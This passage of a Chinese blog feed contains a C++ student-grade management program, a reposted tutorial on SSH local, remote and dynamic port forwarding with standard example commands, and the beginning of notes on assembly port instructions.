class="string">"\n学号输入错误或该学生成绩已经存在！(如需修改，请先删除再重新录入)"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    num++;</span><br><span class="line">    <span class="keyword">if</span>(first==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        first=last=t;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;    </span><br><span class="line">        last-&gt;next=t;</span><br><span class="line">        last=last-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::search()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n请输入要查找的学生的学号:"</span>;<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    student *t = first;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t-&gt;ID==a)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n未找到要查找学生！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n查找成功！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">" 学号    姓名     数学     英语     OPP     总成绩"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    t-&gt;display();        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::del()    </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n请输入要删除的学生的学号: "</span>;<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    student *t = first;</span><br><span class="line">    student *p=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t-&gt;ID==a)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        p=t;</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n未找到要删除学生！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        first=first-&gt;next;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n成功删除学生"</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">delete</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;next=t-&gt;next;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"成功删除学生"</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">delete</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    num--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::showOne()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n想要分析哪一门成绩？请输入相应序号(1:math 2:English 3:OPP):  "</span>;<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">        <span class="keyword">if</span>(a!=<span class="number">1</span>&amp;&amp;a!=<span class="number">2</span>&amp;&amp;a!=<span class="number">3</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n输入序号有误，请重新输入！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n\t成绩分析如下: \n"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    student::analyse(a,first);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::showAll()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------成绩列表----------------------"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">" 学号    姓名     数学     英语     OPP     总成绩"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    student *t = first;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        t-&gt;display();</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::sort()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a,n=<span class="number">0</span>;                  <span class="comment">//n--排名</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"想要按照什么成绩排序？请输入相应序号(1.数学 2.英语 3.OPP 4.总成绩): "</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">        <span class="keyword">if</span> (a!=<span class="number">1</span>&amp;&amp;a!=<span class="number">2</span>&amp;&amp;a!=<span class="number">3</span>&amp;&amp;a!=<span class="number">4</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n输入序号有误，请重新输入 : "</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    student *t=first;</span><br><span class="line">    student *p=t;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        t=first;</span><br><span class="line">        <span class="keyword">while</span>(t-&gt;next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(t-&gt;next-&gt;score[a]&gt;=t-&gt;score[a])</span><br><span class="line">            &#123;</span><br><span class="line">                t-&gt;swap();</span><br><span class="line">            &#125;</span><br><span class="line">            t=t-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    t = first;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n\t 成绩表如下: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"学号    姓名    成绩    排名"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        n++;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;t-&gt;getID()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;t-&gt;getName()&lt;&lt;<span class="string">"  \t"</span>;</span><br><span class="line">        <span class="keyword">switch</span>(a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;getMath()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;getEnglesh()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;getOPP()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;gettotol()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        t=t-&gt;next;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::clear()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"确认要清空所有信息？请输入1或2 (1:确认 2:取消) : "</span>;<span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">    <span class="keyword">if</span> (x==<span class="number">2</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n取消清空\n"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    student *t = first;</span><br><span class="line">    student *p; </span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        p=t;</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n清空成功！\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"退出成功！\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showMenu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"                               \n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"===============================\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      学生成绩管理系统\n\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      1.显示所有学生成绩\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      2.添加信息\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      3.查询信息\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      4.删除信息\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      5.成绩排序\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      6.单科成绩分析\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      7.清空所有信息并退出系统\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      0.退出系统\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"===============================\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"                               \n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    studentMessage stuM=studentMessage();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        showMenu();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入操作对应的序号 : "</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt;h;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">switch</span>(h)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: stuM.showAll(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: stuM.add(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>: stuM.search(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>: stuM.del(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>: stuM.sort(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>: stuM.showOne(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>: stuM.clear(); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n退出成功！"</span>;<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n输入序号有误！请输入正确的序号。"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSH端口转发</title>
      <link href="/2018/12/28/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2018/12/28/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>当你在咖啡馆享受免费 WiFi 的时候，有没有想到可能有人正在窃取你的密码及隐私信息？当你发现实验室的防火墙阻止了你的网络应用端口，是不是有苦难言？来看看 SSH 的端口转发功能能给我们带来什么好处吧！</p><h3 id="端口转发概述"><a href="#端口转发概述" class="headerlink" title="端口转发概述"></a>端口转发概述</h3><p>我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。总的来说 SSH 端口转发能够提供两大功能：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加密 SSH<span class="built_in"> Client </span>端至 SSH<span class="built_in"> Server </span>端之间的通讯数据。</span><br><span class="line">突破防火墙的限制完成一些之前无法建立的 TCP 连接。</span><br></pre></td></tr></table></figure><p>图 1. SSH 端口转发<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/411092.jpg" alt=""></p><p>如上图所示，使用了端口转发之后，TCP 端口 A 与 B 之间现在并不直接通讯，而是转发到了 SSH 客户端及服务端来通讯，从而自动实现了数据加密并同时绕过了防火墙的限制。</p><h2 id="本地转发与远程转发"><a href="#本地转发与远程转发" class="headerlink" title="本地转发与远程转发"></a>本地转发与远程转发</h2><h3 id="本地转发实例分析"><a href="#本地转发实例分析" class="headerlink" title="本地转发实例分析"></a>本地转发实例分析</h3><p>我们先来看第一个例子，在实验室里有一台 LDAP 服务器（LdapServerHost），但是限制了只有本机上部署的应用才能直接连接此 LDAP 服务器。如果我们由于调试或者测试的需要想临时从远程机器（LdapClientHost）直接连接到这个 LDAP 服务器 , 有什么方法能够实现呢？</p><p>答案无疑是本地端口转发了，它的命令格式是：</p><pre><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></pre><p>在 LdapClientHost 上执行如下命令即可建立一个 SSH 的本地端口转发，例如：</p><pre><code>$ ssh -L 7001:localhost:389 LdapServerHost</code></pre><p><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/44696679.jpg" alt=""></p><p>这里需要注意的是本例中我们选择了 7001 端口作为本地的监听端口，在选择端口号时要注意非管理员帐号是无权绑定 1-1023 端口的，所以一般是选用一个 1024-65535 之间的并且尚未使用的端口号即可。</p><p>然后我们可以将远程机器（LdapClientHost）上的应用直接配置到本机的 7001 端口上（而不是 LDAP 服务器的 389 端口上）。之后的数据流将会是下面这个样子：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，</span><br><span class="line">而本机的 SSH<span class="built_in"> Client </span>会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH<span class="built_in"> Server </span>上。</span><br><span class="line">SSH<span class="built_in"> Server </span>会解密收到的数据并将之转发到监听的 LDAP 389 端口上，</span><br><span class="line">最后再将从 LDAP 返回的数据原路返回以完成整个流程。</span><br></pre></td></tr></table></figure><p>我们可以看到，这整个流程应用并没有直接连接 LDAP 服务器，而是连接到了本地的一个监听端口，但是 SSH 端口转发完成了剩下的所有事情，加密，转发，解密，通讯。</p><p>这里有几个地方需要注意：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SSH 端口转发是通过 SSH 连接建立起来的，我们必须保持这个 SSH 连接以使端口转发保持生效。</span><br><span class="line">一旦关闭了此连接，相应的端口转发也会随之关闭。</span><br><span class="line"></span><br><span class="line">我们只能在建立 SSH 连接的同时创建端口转发，而不能给一个已经存在的 SSH 连接增加端口转发。</span><br><span class="line"></span><br><span class="line">你可能会疑惑上面命令中的 &lt;remote host&gt; 为什么用 localhost，它指向的是哪台机器呢？</span><br><span class="line">在本例中，它指向 LdapServertHost 。我们为什么用 localhost 而不是<span class="built_in"> IP </span>地址或者主机名呢？</span><br><span class="line"></span><br><span class="line">其实这个取决于我们之前是如何限制 LDAP 只有本机才能访问。如果只允许 lookback 接口访问的话，那么自然就只有 localhost 或者<span class="built_in"> IP </span>为 127.0.0.1 才能访问了，而不能用真实<span class="built_in"> IP </span>或者主机名。</span><br><span class="line"></span><br><span class="line">命令中的 &lt;remote host&gt; 和 &lt;SSH hostname&gt; 必须是同一台机器么？其实是不一定的，它们可以是两台不同的机器。</span><br><span class="line">我们在后面的例子里会详细阐述这点。</span><br><span class="line"></span><br><span class="line">好了，我们已经在 LdapClientHost 建立了端口转发，那么这个端口转发可以被其他机器使用么？</span><br><span class="line"></span><br><span class="line">比如能否新增加一台 LdapClientHost2 来直接连接 LdapClientHost 的 7001 端口？</span><br><span class="line">答案是不行的，在主流 SSH 实现中，本地端口转发绑定的是 lookback 接口，</span><br><span class="line"></span><br><span class="line">这意味着只有 localhost 或者 127.0.0.1 才能使用本机的端口转发 , 其他机器发起的连接只会得到“<span class="built_in"> connection </span>refused. ”。</span><br><span class="line"></span><br><span class="line">好在 SSH 同时提供了 GatewayPorts 关键字，我们可以通过指定它与其他机器共享这个本地端口转发。</span><br><span class="line"></span><br><span class="line">ssh -g -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</span><br></pre></td></tr></table></figure><h3 id="远程转发实例分析"><a href="#远程转发实例分析" class="headerlink" title="远程转发实例分析"></a>远程转发实例分析</h3><p>我们来看第二个例子，这次假设由于网络或防火墙的原因我们不能用 SSH 直接从 LdapClientHost 连接到 LDAP 服务器（LdapServertHost），但是反向连接却是被允许的。那此时我们的选择自然就是远程端口转发了。</p><p>它的命令格式是：</p><pre><code>ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></pre><p>例如在 LDAP 服务器（LdapServertHost）端执行如下命令：</p><pre><code>$ ssh -R 7001:localhost:389 LdapClientHost</code></pre><p>图 3. 远程端口转发<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/81519205.jpg" alt=""><br>和本地端口转发相比，这次的图里，SSH Server 和 SSH Client 的位置对调了一下，但是数据流依然是一样的。我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，而本机的 SSH Server 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Client 上。 SSH Client 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，最后再将从 LDAP 返回的数据原路返回以完成整个流程。</p><p>看到这里，你是不是会有点糊涂了么？为什么叫本地转发，而有时又叫远程转发？这两者有什么区别？</p><h3 id="本地转发与远程转发的对比与分析"><a href="#本地转发与远程转发的对比与分析" class="headerlink" title="本地转发与远程转发的对比与分析"></a>本地转发与远程转发的对比与分析</h3><p>不错，SSH Server，SSH Client，LdapServertHost，LdapClientHost，本地转发，远程转发，这么多的名词的确容易让人糊涂。让我们来分析一下其中的结构吧。首先，SSH 端口转发自然需要 SSH 连接，而 SSH 连接是有方向的，从 SSH Client 到 SSH Server 。而我们的应用也是有方向的，比如需要连接 LDAP Server 时，LDAP Server 自然就是 Server 端，我们应用连接的方向也是从应用的 Client 端连接到应用的 Server 端。如果这两个连接的方向一致，那我们就说它是本地转发。而如果两个方向不一致，我们就说它是远程转发。</p><p>我们可以回忆上面的两个例子来做个对照。</p><p>本地转发时：</p><p>LdapClientHost 同时是应用的客户端，也是 SSH Client，这两个连接都从它指向 LdapServertHost（既是 LDAP 服务端，也是 SSH Server）。</p><p>远程转发时：</p><p>LdapClientHost 是应用的客户端，但却是 SSH Server ；而 LdapServertHost 是 LDAP 的服务端，但却是 SSH Client 。这样两个连接的方向刚好相反。</p><p>另一个方便记忆的方法是，Server 端的端口都是预定义的固定端口（SSH Server 的端口 22，LDAP 的端口 389），而 Client 端的端口都是动态可供我们选择的端口（如上述例子中选用的 7001 端口）。如果 Server 端的两个端口都在同一台机器，Client 端的两个端口都在另一台机器上，那么这就是本地连接；如果这四个端口交叉分布在两个机器上，每台机器各有一个 Server 端端口，一个 Client 端端口，那就是远程连接。</p><p>弄清楚了两者的区别之后，再来看看两者的相同之处。如果你所在的环境下，既允许 LdapClientHost 发起 SSH 连接到 LdapServerHost，也允许 LdapServerHost 发起 SSH 连接到 LdapClientHost 。那么这时我们选择本地转发或远程转发都是可以的，能完成一样的功能。</p><p>接着让我们来看个进阶版的端口转发。我们之前涉及到的各种连接 / 转发都只涉及到了两台机器，还记得我们在本地转发中提到的一个问题么？本地转发命令中的 <remote host=""> 和 <ssh hostname=""> 可以是不同的机器么？</ssh></remote></p><pre><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></pre><p>答案是可以的！让我们来看一个涉及到四台机器 (A,B,C,D) 的例子。</p><p>图 4. 多主机转发应用<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/37833316.jpg" alt=""><br>在 SSH Client(C) 执行下列命令来建立 SSH 连接以及端口转发：</p><pre><code>$ ssh -g -L 7001:&lt;B&gt;:389 &lt;D&gt;</code></pre><p>然后在我们的应用客户端（A）上配置连接机器（C ）的 7001 端口即可。注意我们在命令中指定了“ -g ”参数以保证机器（A）能够使用机器（C）建立的本地端口转发。而另一个值得注意的地方是，在上述连接中，（A）<-> (C) 以及 (B)<->(D) 之间的连接并不是安全连接，它们之间没有经过 SSH 的加密及解密。如果他们之间的网络并不是值得信赖的网络连接，我们就需要谨慎使用这种连接方式了。</-></-></p><h2 id="其他类型的转发"><a href="#其他类型的转发" class="headerlink" title="其他类型的转发"></a>其他类型的转发</h2><h3 id="动态转发实例分析"><a href="#动态转发实例分析" class="headerlink" title="动态转发实例分析"></a>动态转发实例分析</h3><p>恩，动态转发，听上去很酷。当你看到这里时，有没有想过我们已经讨论过了本地转发，远程转发，但是前提都是要求有一个固定的应用服务端的端口号，例如前面例子中的 LDAP 服务端的 389 端口。那如果没有这个端口号怎么办？等等，什么样的应用会没有这个端口号呢？嗯，比如说用浏览器进行 Web 浏览，比如说 MSN 等等。</p><p>当我们在一个不安全的 WiFi 环境下上网，用 SSH 动态转发来保护我们的网页浏览及 MSN 信息无疑是十分必要的。让我们先来看一下动态转发的命令格式：</p><pre><code>$ ssh -D &lt;local port&gt; &lt;SSH Server&gt;</code></pre><p>例如：</p><pre><code>$ ssh -D 7001 &lt;SSH Server&gt;</code></pre><p>图 5. 动态端口转发<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/94677613.jpg" alt=""></p><p>似乎很简单，我们依然选择了 7001 作为本地的端口号，其实在这里 SSH 是创建了一个 SOCKS 代理服务。来看看帮助文档中对 -D 参数的描述：</p><p>-D port<br> This works by allocating a socket to listen to port on the local<br> side, and whenever a connection is made to this port, the con-<br> nection is forwarded over the secure channel, and the applica-<br> tion protocol is then used to determine where to connect to from<br> the remote machine.  Currently the SOCKS4 and SOCKS5 protocols<br> are supported, and ssh will act as a SOCKS server.  Only root<br> can forward privileged ports.  Dynamic port forwardings can also<br> be specified in the configuration file.</p><p>之后的使用就简单了，我们可以直接使用 localhost:7001 来作为正常的 SOCKS 代理来使用，直接在浏览器或 MSN 上设置即可。在 SSH Client 端无法访问的网站现在也都可以正常浏览。而这里需要值得注意的是，此时 SSH 所包护的范围只包括从浏览器端（SSH Client 端）到 SSH Server 端的连接，并不包含从 SSH Server 端 到目标网站的连接。如果后半截连接的安全不能得到充分的保证的话，这种方式仍不是合适的解决方案。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，我们已经完成了本地端口转发，远程端口转发，动态端口转发以及 X 转发的介绍。回顾起来，总的思路是通过将 TCP 连接转发到 SSH 通道上以解决数据加密以及突破防火墙的种种限制。对一些已知端口号的应用，例如 Telnet/LDAP/SMTP，我们可以使用本地端口转发或者远程端口转发来达到目的。动态端口转发则可以实现 SOCKS 代理从而加密以及突破防火墙对 Web 浏览的限制。对于 X 应用，无疑是 X 转发最为适用了。虽然每一部分我们都只是简单的介绍了一下，但如果能灵活应用这些技巧，相信对我们的日常生活 / 工作也是会有所帮助的。</p><p>来自:<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>汇编指令学习</title>
      <link href="/2018/12/26/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/12/26/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="INT-OUT"><a href="#INT-OUT" class="headerlink" title="INT OUT"></a>INT OUT</h2><p><strong>期末的计算机组成原理的课程设计,要学习看懂汇编语言,记录一些汇编指令</strong><br>CPU对外设的操作通过专门的端口读写指令来完成；<br>　　读端口用IN指令，写端口用OUT指令。</p><pre><code>IN AL,21H；表示从21H端口读取一字节数据到ALIN AX,21H；表示从端口地址21H读取1字节数据到AL，从端口地址22H读取1字节到AH</code></pre><p>MOV DX,379H<br>　　IN AL,DX ；从端口379H读取1字节到AL<br>OUT 21H,AL；将AL的值写入21H端口<br>　　OUT 21H,AX；将AX的值写入端口地址21H开始的连续两个字节。</p><h2 id="assume-cs-code-ds-data"><a href="#assume-cs-code-ds-data" class="headerlink" title="assume cs:code,ds:data"></a>assume cs:code,ds:data</h2><p><strong>assume</strong>，这个单词是“假设”的意思,告诉编译器，段寄存器和段名之间的关系<br>这是段分配语句，是条伪指令，一般放在代码段的第一条位置，段分配语句仅仅是建立段寄存器和段名之间关系，不具有赋值功能，<br>比如你创建了几个段，怎么知道它是代码段，它是数据段，就靠这条语句，<br>因为段名是可以随意取的，你可以把code取成代码段，也可以是其他名字，通过这条语句就可以把他们的关系建立起来</p><pre><code>mov dx,offset s</code></pre><p>这句话意思是将s的偏移地址传给dx</p><h2 id="data-segment"><a href="#data-segment" class="headerlink" title="data segment"></a>data 